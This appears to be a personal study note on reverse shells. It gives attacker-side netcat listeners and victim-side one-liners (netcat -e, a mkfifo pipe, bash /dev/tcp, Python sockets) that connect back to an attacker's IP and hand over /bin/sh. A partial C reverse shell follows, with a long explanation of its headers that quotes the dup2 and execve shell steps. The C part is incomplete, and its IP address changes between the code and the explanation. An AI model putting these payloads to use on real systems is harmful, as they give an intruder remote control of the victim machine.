---
title: Reverse Shell
aliases:
  - Reverse Shell
---
## 1. Simple netcat Reverse Shell
---
### Run command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `nc -e /bin/sh {attackers IP} port`

![[images/Pasted image 20250424100653.png]]

## 2. Netcat without -e
---
Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_HOLE` disabled, it means you **don’t have the -e** option of netcat.

> In this case,

### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `mkfifo /tmp/p; nc {attackers IP} <port> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`

![[images/Pasted image 20250424101401.png]]

## 3. Bash
---
### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `bash -c 'sh -i >& /dev/tcp/<Attacker's IP>/<port> 0>&1'`

![[images/Pasted image 20250424101632.png]]

## 4. Python
---
### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : 
`python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<Attacker's IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`

![[images/Pasted image 20250424120632.png]]

## 5. Reverse Shell in C
---
#### Reverse Shell running on Linux (Target Machine)
### Code
```C
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main () {
	const char* ip = "192.168.0.108";
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);
}
```

### Explanation
```C
#include <stdio.h>
```

`<stdio.h>` : It is a **Header file** basic I/O like `printf()`, etc.

```C
#include <sys/socket.h>
```
`<sys/socket.h>` is a **header file in C** that provides the **definitions and functions for using sockets**—which are used for network communication.
#### Here's what it includes:

- **Socket-related system calls**:
    - `socket()` – create a socket
    - `bind()` – bind a socket to an IP/port
    - `connect()` – connect to another socket
    - `accept()` – accept an incoming connection
    - `listen()` – mark a socket as passive (waiting for connections)
    - `send()` / `recv()` – send or receive data
- **Socket structures and constants**:
    - `struct sockaddr`
    - `AF_INET`, `SOCK_STREAM`, etc.

`<sys/socket.h>` is what lets your C program **create and work with network sockets** on Unix-like systems.

```C
#include <netinet/ip.h>
```
`<netinet/ip.h>` is a C header file that provides **definitions for IP (Internet Protocol) related structures and constants**, specifically for **IPv4** networking.

- The key thing it defines is:
    - `struct iphdr` – this is the structure of an IPv4 header. It describes how an IP packet looks on the network.

In older or more complex socket programs (like raw sockets or packet crafting), you might manually build IP headers. That's when you'd need this file. But for **simple client/server TCP sockets** like your code, it's usually **not necessary** to include `<netinet/ip.h>` unless you’re doing low-level networking.

- `<netinet/ip.h>` gives you access to **IP packet structures**.
- Mostly used for **raw sockets**, **packet analysis**, or **custom protocol implementation**.

```C
#include <arpa/inet.h>
```
`<arpa/inet.h>` is a C header file that provides **functions for manipulating IP addresses**, especially for converting between **text (string) and binary formats** used in network programming.

 **🔧 Functions it provides (common ones):**

-  `inet_aton()`
	- Converts a string IP like `"192.168.1.1"` to a binary form.
	- Used in code:
	  ```c
	    inet_aton(ip, &addr.sin_addr);
	    ```
-  `inet_ntoa()`
	- Opposite of `inet_aton()` — converts a binary IP back to a string.
- `inet_pton()` and `inet_ntop()`
	- Newer versions of `aton` and `ntoa`, and they support both **IPv4 and IPv6**.
	- `pton`: presentation → numeric        
    - `ntop`: numeric → presentation        

When you're dealing with sockets in C, the system doesn't understand IPs as strings like `"10.9.1.6"` — it wants them in **binary form** (`struct in_addr`), and `<arpa/inet.h>` gives you the tools to do that conversion.

| Function      | What it does               |
| ------------- | -------------------------- |
| `inet_aton()` | "192.168.0.1" → binary     |
| `inet_ntoa()` | binary → "192.168.0.1"     |
| `inet_pton()` | text to binary (IPv4/IPv6) |
| `inet_ntop()` | binary to text (IPv4/IPv6) |

```C
#include <unistd.h>
```
`<unistd.h>` is a **POSIX (Unix standard)** header file that gives you access to **low-level OS functions**, mainly related to **I/O, processes, and [file descriptors](https://en.wikipedia.org/wiki/File_descriptor)**.

**`dup2(int oldfd, int newfd)`**
- Duplicates one [file descriptor](https://en.wikipedia.org/wiki/File_descriptor) onto another.
- In  code:
    ```c
    dup2(sockfd, i);
    ```
This redirects `stdin`, `stdout`, and `stderr` to the socket.

**`execve(const char *path, char *const argv[], char *const envp[])`**
- Replaces the current process with a new one.
- In code:
    ```c
    execve("/bin/sh", NULL, NULL);
    ```
This gives the attacker a shell.

**Other common things in `<unistd.h>`:**

| Function   | What it does                            |
| ---------- | --------------------------------------- |
| `read()`   | Read data from a file/socket            |
| `write()`  | Write data to a file/socket             |
| `fork()`   | Create a new process                    |
| `close()`  | Close a file descriptor                 |
| `getpid()` | Get the current process ID              |
| `sleep()`  | Pause execution for a number of seconds |
`<unistd.h>` gives you direct access to **system-level functions** for:
- **Process control**
- **File/socket I/O**
- **Execing new programs**

It's essential for making C programs that interact closely with the OS.

```C
int main()
```

In C, `main()` is the **entry point** of any program.

When you run a compiled C program, the operating system calls the `main()` function **first** — always. It’s where your program **starts executing**.

**📌 Why `int`?**

The `int` before `main` means the function returns an **integer** to the operating system. This value tells the system if the program **succeeded** or **failed**.
- Returning `0` means **success**.
- Returning any non-zero number usually means **an error**.
Example:

```c
int main() {
    // your code
    return 0; // success
}
```

**Variations of `main()`:**
1. **No command line arguments**:
    ```c
    int main() { ... }
    ```
2. **With command line arguments**:
    ```c
    int main(int argc, char *argv[]) { ... }
    ```
    - `argc` (argument count): Number of command-line arguments.
    - `argv` (argument vector): Array of strings containing the arguments.


```C
const char* ip = "192.168.0.108";
```

 **`const`**
- This means the value the pointer points to **can’t be changed**.
- You’re saying: _“I’m not going to modify this string.”_

 **`char*`**
- A pointer to a **character (char)** — in this case, the **first character of a string**.

**`"10.9.1.6"`**
- This is a **string literal** (a sequence of characters).
- It's stored in **read-only memory** in C.

**`ip`**
- This is the **variable name**, and it holds the pointer to the first character of the string.


```c
struct sockaddr_in addr;
```
You're creating a variable `addr` of type `struct sockaddr_in`.

This structure is used to **store IPv4 socket address information** — like IP address and port — that the socket will connect or bind to.

> **Why `sockaddr_in` and not just `sockaddr`?**

1.  `struct sockaddr_in` — **specific to IPv4**
- Contains **fields for IP and port** that are easy to work with.
- Designed to make **setting up IPv4 addresses** easier.
- Used for:
    - `connect()`, `bind()`, `accept()`, etc. — but via a cast to `sockaddr`.

```c
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
inet_aton("10.9.1.6", &addr.sin_addr);
```

You set the IP and port **directly** using its named fields.

2.  `struct sockaddr` = **generic placeholder**

- It’s a more **abstract structure**.
- Used as a **base type** that works for **any protocol** (IPv4, IPv6, Unix domain, etc.).
- Looks like this:

```c
struct sockaddr {
    unsigned short sa_family;   // Address family (AF_INET, AF_INET6, etc.)
    char sa_data[14];           // Protocol-specific address data
};
```

**Notice:** it doesn’t tell you **how to structure IP addresses or ports** - it just holds raw data.

The actual structure (like `sockaddr_in` for IPv4 or `sockaddr_in6` for IPv6) is **cast to `sockaddr*`** when passed into socket functions.

> **🧠 Analogy**

Think of `sockaddr` as a **base class** or **interface** (like in OOP).  
And `sockaddr_in`, `sockaddr_in6`, `sockaddr_un` are the **specific implementations**.

You _store the real info_ in `sockaddr_in`, but _pass it around_ as a `sockaddr*`.

| Struct        | Use for | Contains IP & Port? | Used in system calls |
| ------------- | ------- | ------------------- | -------------------- |
| `sockaddr_in` | IPv4    | ✅ Yes               | ✅ (via cast)         |
| `sockaddr`    | Generic | ❌ No (raw only)     | ✅ Required type      |

